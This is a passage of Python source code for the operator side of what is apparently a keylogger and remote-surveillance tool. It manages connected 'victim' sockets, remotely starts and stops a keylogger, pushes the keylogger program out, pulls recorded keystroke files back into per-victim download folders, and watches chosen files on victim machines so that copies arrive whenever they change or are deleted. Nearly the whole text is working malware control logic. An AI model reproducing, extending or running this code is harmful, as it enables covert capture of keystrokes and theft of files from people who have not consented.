        print(error_msg.format(client_ip, client_port))
        print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
        return True
    else:
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return False


def is_keylogging(status: bool, client_ip: str, client_port: int, error_msg: str):
    if status:
        print(error_msg.format(client_ip, client_port))
        print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return True
    else:
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return False


def is_watching(status: bool, client_ip: str, client_port: int, error_msg: str):
    if status:
        print(error_msg.format(client_ip, client_port))
        print(constants.WATCH_STATUS_TRUE_ERROR_SUGGEST)
        return True
    else:
        return False


def receive_keylog_files(client_socket, number_of_files: int, sub_directory_path: str):
    """
    Receives any recorded keylog .txt files from the client/victim

    :param client_socket:
            The client socket

    :param number_of_files:
            An integer representing the number of .txt files on client/victim side

    :param sub_directory_path:
            A string containing the "/download/[IP_address]" path

    :return: None
    """

    for i in range(int(number_of_files)):
        file_name = client_socket.recv(constants.BYTE_LIMIT).decode()
        print(constants.RECEIVING_FILE_MSG.format(file_name))

        file_path = os.path.join(sub_directory_path, file_name)

        with open(file_path, constants.WRITE_BINARY_MODE) as file:
            while True:
                data = client_socket.recv(constants.BYTE_LIMIT)
                if not data:
                    break
                if data.endswith(constants.END_OF_FILE_SIGNAL):
                    data = data[:-len(constants.END_OF_FILE_SIGNAL)]
                    file.write(data)
                    break
                file.write(data)

        # Send ACK to commander (if good)
        if is_file_openable(file_path):
            print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
            client_socket.send(constants.VICTIM_ACK.encode())
        else:
            client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())


def find_specific_client_socket(client_dict: dict,
                                target_ip: str,
                                target_port: int):
    try:
        # Initialize Variables
        target_socket = None
        is_keylog = False
        is_watching_file = False

        # Check target_ip and target_port
        ipaddress.ip_address(target_ip)

        # Find a specific client socket from client socket list to send data to
        for client_sock, client_info in client_dict.items():
            if client_info[:2] == (target_ip, target_port):
                target_socket = client_sock
                is_keylog = client_info[2]
                is_watching_file = client_info[3]
                break

        # Check if target_socket is not None and return
        if target_socket:
            return target_socket, target_ip, target_port, is_keylog, is_watching_file
        else:
            return None, None, None, None, None

    except ValueError as e:
        print(constants.INVALID_INPUT_ERROR.format(e))
        return None, None, None, None, None


def perform_menu_item_3(client_dict: dict):
    # CASE 1: Check if client list is empty
    if len(client_dict) == constants.ZERO:
        print(constants.FILE_TRANSFER_NO_CONNECTED_CLIENTS_ERROR)

    # CASE 2: Handle single client in client list
    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
        client_socket, (client_ip, client_port, status, status_2) = next(iter(client_dict.items()))

        # Check if target socket is currently running keylogger
        if __is_keylogging(status, client_ip, client_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None

        # Check if file/directory watching
        if is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None

        transfer_keylog_program(client_socket, client_ip, client_port)

    # CASE 3: Send keylogger to any specific connected victim
    elif len(client_dict) != constants.ZERO:
        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(client_dict,
                                                                                              target_ip,
                                                                                              target_port)

        # Check if target socket is currently running keylogger
        if __is_keylogging(status, target_ip, target_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None

        # Check if file/directory watching
        if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None

        if target_socket:
            transfer_keylog_program(target_socket, target_ip, target_port)
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)

    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)


def perform_menu_item_1(client_dict: dict):
    print(constants.START_KEYLOG_INITIAL_MSG)

    # a) CASE: Check if client list is empty
    if len(client_dict) == constants.ZERO:
        print(constants.CLIENT_LIST_EMPTY_ERROR)
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)

    # b) CASE: Handle single client in client list
    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
        # Get client socket
        client_socket, (ip, port, status, status_2) = next(iter(client_dict.items()))

        if __is_keylogging(status, ip, port, constants.KEYLOG_STATUS_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None
        if is_watching(status_2, ip, port, constants.WATCH_STATUS_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None
        else:
            __perform_menu_item_1_helper(client_socket, client_dict, ip, port, status_2)

    # c) CASE: Handle any specific connected client in client list
    elif len(client_dict) != constants.ZERO:
        target_ip = input(constants.ENTER_TARGET_IP_START_KEYLOG)
        target_port = int(input(constants.ENTER_TARGET_PORT_START_KEYLOG))
        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(client_dict,
                                                                                              target_ip,
                                                                                              target_port)
        if target_socket:
            if __is_keylogging(status, target_ip, target_port, constants.KEYLOG_STATUS_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return None
            if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return None
            else:
                __perform_menu_item_1_helper(target_socket, client_dict, target_ip, target_port, status_2)
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)

    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)


def __perform_menu_item_1_helper(client_socket: socket.socket, client_dict: dict,
                                 ip: str, port: int, is_watching: bool):
    # Send signal to start keylog
    print(constants.START_SEND_SIGNAL_MSG.format(constants.KEYLOG_FILE_NAME, ip, port))
    client_socket.send(constants.START_KEYLOG_MSG.encode())

    # Await OK signal from client
    print(constants.AWAIT_START_RESPONSE_MSG)
    ack = client_socket.recv(constants.BYTE_LIMIT).decode()

    #  i) Check if keylogger.py is in victim's directory
    try:
        if ack == constants.RECEIVED_CONFIRMATION_MSG:
            print(constants.START_SIGNAL_RECEIVED_MSG.format(constants.KEYLOG_FILE_NAME))
            client_socket.send(constants.CHECK_KEYLOG.encode())

            print(constants.START_SIGNAL_SEND_FILE_NAME.format(constants.KEYLOG_FILE_NAME))
            client_socket.send(constants.KEYLOG_FILE_NAME.encode())

            # Get status
            print(constants.AWAIT_START_RESPONSE_MSG)
            status = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
            msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()

            if status == constants.STATUS_TRUE:
                print(constants.CLIENT_RESPONSE.format(msg))

                # Send signal to victim to start
                print(constants.START_SIGNAL_EXECUTE_KEYLOG.format(constants.KEYLOG_FILE_NAME))
                client_socket.send(constants.START_KEYLOG_MSG.encode())

                # Awaiting Response
                msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
                print(constants.CLIENT_RESPONSE.format(msg))

                # Replace the keylog status of the client in client dictionary to True
                client_dict[client_socket] = (ip, port, True, is_watching)

                print(constants.STOP_KEYLOG_SUGGESTION_MSG.format(ip, port))
            else:
                print(constants.CLIENT_RESPONSE.format(msg))
                print(constants.MISSING_KEYLOG_FILE_SUGGEST_MSG)

        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)

    except Exception as e:
        print(constants.KEYLOG_FILE_CHECK_ERROR.format(constants.KEYLOG_FILE_NAME, e))


def perform_menu_item_2(client_dict: dict):
    print(constants.STOP_KEYLOG_INITIAL_MSG)

    # a) CASE: Check if client list is empty
    if len(client_dict) == constants.ZERO:
        print(constants.CLIENT_LIST_EMPTY_ERROR)
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)

    # b) CASE: Handle single client in client list
    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
        # Get client socket
        client_socket, (ip, port, status, status_2) = next(iter(client_dict.items()))
        __perform_menu_item_2_helper(client_dict, client_socket, ip, port, status, status_2)

    # c) CASE: Handle for clients greater than 1
    elif len(client_dict) != constants.ZERO:
        target_ip = input(constants.ENTER_TARGET_IP_STOP_KEYLOG)
        target_port = int(input(constants.ENTER_TARGET_PORT_STOP_KEYLOG))
        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(client_dict,
                                                                                              target_ip,
                                                                                              target_port)

        if target_socket:
            __perform_menu_item_2_helper(client_dict, target_socket,
                                         target_ip, target_port, status, status_2)
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)


def __perform_menu_item_2_helper(client_dict: dict, client_socket: socket.socket,
                                 target_ip: str, target_port: int, status: bool,
                                 status_2: bool):
    # Check watching status
    if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return None

    # Check keylog status
    if not __is_keylogging(status, target_ip, target_port, constants.STOP_KEYLOG_STATUS_FALSE):
        print(constants.STOP_KEYLOG_STATUS_FALSE.format(target_ip, target_port))
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return None
    else:
        # Get signal from user to stop keylog on client/victim side
        signal_to_stop = constants.ZERO
        print(constants.STOP_KEYLOGGER_PROMPT)

        while True:
            try:
                signal_to_stop = int(input())
                if signal_to_stop == constants.PERFORM_MENU_ITEM_TWO:
                    client_socket.send(constants.STOP_KEYWORD.encode())
                    break
                print(constants.INVALID_INPUT_STOP_KEYLOGGER)
            except ValueError as e:
                print(constants.INVALID_INPUT_STOP_KEYLOGGER)

        # Await Results from keylogger on client/victim side (BLOCKING CALL)
        result = client_socket.recv(constants.BYTE_LIMIT).decode().split("/")
        result_status = result[0]
        result_msg = result[1]

        if result_status == constants.STATUS_TRUE:
            print(constants.CLIENT_RESPONSE.format(result_msg))
            print(constants.KEYLOG_OPERATION_SUCCESSFUL)

            # Update client status
            client_dict[client_socket] = (target_ip, target_port, False, status_2)
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
        else:
            print(constants.STOP_KEYLOG_RESULT_ERROR.format(result_msg))
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)


def __make_main_and_sub_directories(client_ip: str):
    main_directory = constants.DOWNLOADS_DIR
    sub_directory = str(client_ip)

    # Create the main directory (if it doesn't exist)
    if not os.path.exists(main_directory):
        print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(main_directory))
        os.mkdir(main_directory)
        print(constants.DIRECTORY_SUCCESS_MSG)

    # Get subdirectory path (downloads/[IP_addr])
    sub_directory_path = os.path.join(main_directory, sub_directory)

    # Create subdirectory (if it doesn't exist)
    if not os.path.exists(sub_directory_path):
        print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(sub_directory_path))
        os.mkdir(sub_directory_path)
        print(constants.DIRECTORY_SUCCESS_MSG)

    return sub_directory_path


def perform_menu_item_4(client_dict: dict):
    # CASE 1: Check if client list is empty
    if len(client_dict) == constants.ZERO:
        print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)

    # CASE 2: Handle single client in client list
    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
        client_socket, (client_ip, client_port, status, status_2) = next(iter(client_dict.items()))

        # Check status
        if __is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None
        elif is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None
        else:
            __perform_menu_item_4_helper(client_socket, client_ip, client_port)

    # CASE 3: Handle a specific client/victim (or if multiple clients)
    elif len(client_dict) != constants.ZERO:
        target_ip = input(constants.ENTER_TARGET_IP_GET_FILES)
        target_port = int(input(constants.ENTER_TARGET_PORT_GET_FILES))
        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(client_dict,
                                                                                              target_ip,
                                                                                              target_port)

        if target_socket:
            if __is_keylogging(status, target_ip, target_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return None
            else:
                __perform_menu_item_4_helper(target_socket, target_ip, target_port)
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)


def __perform_menu_item_4_helper(client_socket: socket.socket, client_ip: str, client_port: int):
    # Send to victim a notification that it is wanting to receive keylog files
    print(constants.SEND_GET_KEYLOG_SIGNAL_PROMPT)
    client_socket.send(constants.TRANSFER_KEYLOG_FILE_SIGNAL.encode())

    # Await response if there are any .txt files to transfer
    print(constants.GET_KEYLOG_PROCESS_MSG.format(client_ip, client_port))
    response = client_socket.recv(constants.BYTE_LIMIT).decode().split('/')
    response_status = response[0]
    response_msg = response[1]
    print(constants.CLIENT_RESPONSE.format(response_msg))

    # If present, then create directory (eg: downloads/127.0.0.1) and start file transfer
    if response_status == constants.STATUS_TRUE:
        sub_directory_path = __make_main_and_sub_directories(client_ip)

        # Send ACK response
        client_socket.send("OK".encode())

        # Get number of files from client/victim for iteration length
        number_of_files = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()

        # Send ACK
        client_socket.send("OK".encode())

        # ADD files from client to commander
        receive_keylog_files(client_socket, int(number_of_files), sub_directory_path)

        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
    else:
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)


def create_file_name(file_path: str):
    # Get system date and time (Format: {file_name}_{Date}_{Time}_AM/PM)
    current_datetime = datetime.datetime.now().strftime("%Y-%m-%d %I-%M-%S %p")

    # Replace spaces with underscores if needed
    current_datetime = current_datetime.replace(" ", "_")

    # Parse file_path for actual file name
    parsed_file_path = file_path.split("/")
    file_name = parsed_file_path[-1].split('.')
    extension = file_name[1]

    # Append new file name with date + time
    file_name = f"{parsed_file_path[-1].split('.')[0]}_{current_datetime}.{extension}"
    return file_name


def __process_deletion_timeout(client_ip,
                               client_list,
                               client_port,
                               client_socket,
                               file_path,
                               is_keylog,
                               signal_queue: queue.Queue):
    # Print Termination Statements
    print(constants.WATCH_FILE_DELETE_DETECTED_MSG.format(file_path, client_ip, client_port))
    print(constants.WATCH_FILE_THREAD_TERMINATING)

    # Reset is_watching_file flag to default (False)
    client_list[client_socket] = (client_ip, client_port, is_keylog, False)

    # Reset SetTimeOut Timer (to prevent disconnection)
    client_socket.settimeout(None)

    # Send signal to signal_queue to notify main() that global_thread has stopped
    signal_queue.put(constants.STOP_KEYWORD)

    # Send a signal back to client/victim to stop their watch_file_stop_signal() thread
    client_socket.send(constants.STOP_KEYWORD.encode())
    print(constants.THREAD_STOPPED_MSG)


def watch_file_client_socket(client_socket: socket.socket,
                             signal_queue: queue.Queue,
                             file_path: str,
                             sub_directory_path: str,
                             client_list: dict,
                             client_ip: str,
                             client_port: int,
                             is_keylog: bool):
    while True:
        try:
            # Check if a stop signal is received; remove signal from queue and send signal to client
            if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
                client_socket.send(constants.STOP_KEYWORD.encode())
                break

            # Get Event from Client
            event = client_socket.recv(20).decode()

            # MODIFY: Get File If Modified
            if event == "IN_MODIFY":
                file_name = create_file_name(file_path)
                new_file_path = sub_directory_path + "/" + file_name

                # Receive Modified File
                with open(new_file_path, "wb") as file:
                    eof_marker = constants.END_OF_FILE_SIGNAL  # Define the end-of-file marker

                    while True:
                        file_data = client_socket.recv(1024)
                        if not file_data:
                            break  # No more data received
                        if file_data.endswith(eof_marker):
                            file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
                            break
                        else:
                            file.write(file_data)

                if is_file_openable(new_file_path):
                    print(constants.WATCH_FILE_TRANSFER_SUCCESS_MODIFY.format(file_name))
                else:
                    print(constants.FILE_TRANSFER_ERROR)

            # DELETED: Move File to Deleted Directory (as Backup)
            if event == "IN_DELETE" or event == "IN_DELETE_SELF":
                file_name = create_file_name(file_path)

                # Check if a "deleted" directory exists, if not, create a deleted folder
                deleted_dir_path = sub_directory_path + "/" + constants.DELETED_DIRECTORY
                if not os.path.exists(deleted_dir_path):
                    print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(deleted_dir_path))
                    os.mkdir(deleted_dir_path)
                    print(constants.DIRECTORY_SUCCESS_MSG)

                # Generate new file path
                deleted_file_path = deleted_dir_path + "/" + file_name

                # Receive Modified File
                with open(deleted_file_path, "wb") as file:
                    eof_marker = constants.END_OF_FILE_SIGNAL  # Define the end-of-file marker

                    while True:
                        file_data = client_socket.recv(1024)
                        if not file_data:
                            break  # No more data received
                        if file_data.endswith(eof_marker):
                            file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
                            break
                        else:
                            file.write(file_data)

                if is_file_openable(deleted_file_path):
                    print(constants.WATCH_FILE_TRANSFER_SUCCESS_DELETION.format(file_name))
                else:
                    print(constants.FILE_TRANSFER_ERROR)

                # Set socket timeout (for 5 seconds) because there is no more file to watch!
                client_socket.settimeout(5)

        except socket.timeout:
            __process_deletion_timeout(client_ip, client_list, client_port,
                                       client_socket, file_path, is_keylog,
                                       signal_queue)
            return None

        except TimeoutError:
            __process_deletion_timeout(client_ip, client_list, client_port,
                                       client_socket, file_path, is_keylog,
                                       signal_queue)
            return None

    # Set WATCH_FILE status to false (Before ending thread)
    client_list[client_socket] = (client_ip, client_port, is_keylog, False)
    print(constants.WATCH_FILE_THREAD_STOP)
    print(constants.WATCH_FILE_THREAD_STOP_SUCCESS)


def __perform_menu_item_9_helper(client_dict: dict, client_socket: socket.socket,
                                 target_ip: str, target_port: int, status: bool,
                                 status_2: bool, global_thread: None,
                                 signal_queue: queue.Queue):
    # Check if currently keylogging
    if __is_keylogging(status, target_ip, target_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return global_thread

    # Check if currently watching a file
    if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return global_thread
    else:
        # Send the notification to the victim that commander wants to watch a file
        client_socket.send(constants.WATCH_FILE_SIGNAL.encode())

        # Prompt user input + send file path to victim
        filename = input("[+] Enter the path of the file to watch: ")
        client_socket.send(filename.encode())

        # Get Response
        res = client_socket.recv(constants.BYTE_LIMIT).decode().split("/")

        # Logic
        if res[0] == constants.STATUS_TRUE:
            print(constants.CLIENT_RESPONSE.format(res[1]))
            print("[+] Now watching file {} from client ({}, {})...".format(filename,
                                                                            target_ip,
                                                                            target_port))

            # a) Create downloads/victim_ip directory (if necessary)
            sub_directory_path = __make_main_and_sub_directories(target_ip)

            # b) Update state of socket to is_watching
            client_dict[client_socket] = (target_ip, target_port, status, True)

            # c) Check signal queue if thread has stopped due to a previous deletion event
            if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
                global_thread = None

            # d) Create + Start a thread to monitor client socket and handle modify/deleted files
            if global_thread is None:
                global_thread = threading.Thread(target=watch_file_client_socket,
                                                 args=(client_socket,
                                                       signal_queue,
                                                       filename,
                                                       sub_directory_path,
                                                       client_dict,
                                                       target_ip,
                                                       target_port,
                                                       status),
                                                 name="Watch_File_Client_Socket")
                global_thread.daemon = True
                global_thread.start()
                print(constants.THREAD_START_MSG.format(global_thread.name))
                return global_thread
        else:
            print(constants.CLIENT_RESPONSE.format(res[1]))
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return global_thread


def perform_menu_item_9(client_list: dict, global_thread: None, signal_queue: queue.Queue):
    print(constants.START_WATCH_FILE_MSG)

    # CASE 1: Check if client list is empty
    if len(client_list) == constants.ZERO:
        print(constants.WATCH_FILE_NO_CLIENTS_ERROR)

    # CASE 2: Handle single client in client list
    if len(client_list) == constants.CLIENT_LIST_INITIAL_SIZE:
        client_socket, (client_ip, client_port, status, status_2) = next(iter(client_list.items()))
        global_thread = __perform_menu_item_9_helper(client_list, client_socket, client_ip, client_port,
                                                     status, status_2, global_thread, signal_queue)
        return global_thread

    # CASE 3: [Multiple Clients] - Watch File for a specific connected victim
    elif len(client_list) != constants.ZERO:
        ip = input(constants.ENTER_TARGET_IP_START_KEYLOG)
        port = int(input(constants.ENTER_TARGET_PORT_START_KEYLOG))
        (target_socket, ip, port, status, status_2) = find_specific_client_socket(client_list,
                                                                                  ip, port)

        if target_socket:
            if __is_keylogging(status, ip, port, constants.KEYLOG_STATUS_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return global_thread
            if is_watching(status_2, ip, port, constants.WATCH_STATUS_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return global_thread
            else:
                print("[+] PENDING IMPLEMENTATION: Watch File for multiple clients is "
                      "under development!")
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)

    # Print closing statements
    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)
    return global_thread


def __perform_menu_item_11_helper(target_ip: str, target_port: int,
                                  global_thread: threading.Thread,
                                  signal_queue: queue.Queue):
    try:
        # a) Stop Thread + Signal to client + Update Status
        if global_thread is not None:
            print(constants.THREAD_STOPPING_MSG.format(global_thread.name))
            print(constants.STOP_WATCH_FILE_TIP.format(target_ip, target_port))
            signal_queue.put(constants.STOP_KEYWORD)

            # Wait for thread to finish
            global_thread.join()
            print(constants.THREAD_STOPPED_MSG)

            # Set and return global thread to None
            global_thread = None
            return global_thread

    except KeyboardInterrupt:
        # Wait for thread to finish
        global_thread.join()

        # Set global thread to None
        global_thread = None
        print(constants.KEYBOARD_INTERRUPT_MSG)
        print(constants.STOP_WATCH_THREAD_CONCURRENCY_WARNING.format(target_ip, target_port))
        return global_thread


def perform_menu_item_11(client_list: dict,
                         global_thread: None,
                         signal_queue: queue.Queue):
    print(constants.STOP_WATCH_FILE_MSG)

    # CASE 1: Check if client list is empty
    if len(client_list) == constants.ZERO:
        print(constants.STOP_WATCH_FILE_NO_CLIENTS_ERROR)

    # CASE 2: Handle single client in client list
    if len(client_list) == constants.CLIENT_LIST_INITIAL_SIZE:
        client_socket, (client_ip, client_port, status, status_2) = next(iter(client_list.items()))

        # Check if currently keylogging
        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
            print(constants.RETURN_MAIN_MENU_MSG)
            print(constants.MENU_CLOSING_BANNER)
            return None

        # Check if currently watching a file
        if status_2:
            __perform_menu_item_11_helper(client_ip, client_port, global_thread, signal_queue)
        else:
            print(constants.NOT_WATCHING_FILE_ERROR)

    # CASE 3: [Multiple Clients] Watch File for a specific connected victim
    elif len(client_list) != constants.ZERO:
        ip = input(constants.ENTER_TARGET_IP_START_KEYLOG)
        port = int(input(constants.ENTER_TARGET_PORT_START_KEYLOG))
        (target_socket, ip, port, status, status_2) = find_specific_client_socket(client_list,
                                                                                  ip, port)

        if target_socket:
            if is_keylogging(status, ip, port, constants.KEYLOG_STATUS_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                return None
            if not is_watching(status_2, ip, port, constants.WATCH_STATUS_TRUE_ERROR):
                print(constants.RETURN_MAIN_MENU_MSG)
                print(constants.MENU_CLOSING_BANNER)
                print(constants.NOT_WATCHING_FILE_ERROR)
                return None
            else:
                __perform_menu_item_11_helper(ip, port, global_thread, signal_queue)
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)

    # Print closing statements
    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)
